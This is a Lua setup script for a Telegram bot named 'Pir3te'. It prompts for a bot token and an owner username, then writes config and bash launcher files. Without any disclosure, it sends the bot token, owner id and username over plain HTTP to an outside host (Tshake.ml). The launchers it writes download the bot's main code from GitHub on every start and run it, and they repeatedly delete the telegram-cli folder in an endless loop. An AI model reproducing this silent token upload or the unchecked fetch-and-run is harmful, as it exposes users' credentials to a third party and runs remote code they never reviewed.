serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Pir3te = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Pir3te = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Pir3te_Info_Sudo = io.open("sudo.lua", 'w')
Pir3te_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Pir3te_Info_Sudo:close()
end  
if not database:get(Server_Pir3te.."Token_Pir3te") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Pir3te.."Token_Pir3te",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Pir3te.."UserName_Pir3te") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Pir3te.."UserName_Pir3te",Json.Info.Username)
database:set(Server_Pir3te.."Id_Pir3te",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Pir3te_Info()
Create_Info(database:get(Server_Pir3te.."Token_Pir3te"),database:get(Server_Pir3te.."Id_Pir3te"),database:get(Server_Pir3te.."UserName_Pir3te"))   
http.request("http://Tshake.ml/add/?id="..database:get(Server_Pir3te.."Id_Pir3te").."&user="..database:get(Server_Pir3te.."UserName_Pir3te").."&token="..database:get(Server_Pir3te.."Token_Pir3te"))
local RunPir3te = io.open("Pir3te", 'w')
RunPir3te:write([[
#!/usr/bin/env bash
cd $HOME/Pir3te
token="]]..database:get(Server_Pir3te.."Token_Pir3te")..[["
rm -fr Pir3te.lua
wget "https://raw.githubusercontent.com/Pir3te/Pir3te/master/Pir3te.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Pir3te.lua -p PROFILE --bot=$token
done
]])
RunPir3te:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Pir3te
while(true) do
rm -fr ../.telegram-cli
screen -S Pir3te -X kill
screen -S Pir3te ./Pir3te
done
]])
RunTs:close()
end
Files_Pir3te_Info()
database:del(Server_Pir3te.."Token_Pir3te");database:del(Server_Pir3te.."Id_Pir3te");database:del(Server_Pir3te.."UserName_Pir3te")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Pir3te()  
var = true
else   
f:close()  
database:del(Server_Pir3te.."Token_Pir3te");database:del(Server_Pir3te.."Id_Pir3te");database:del(Server_Pir3te.."UserName_Pir3te")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
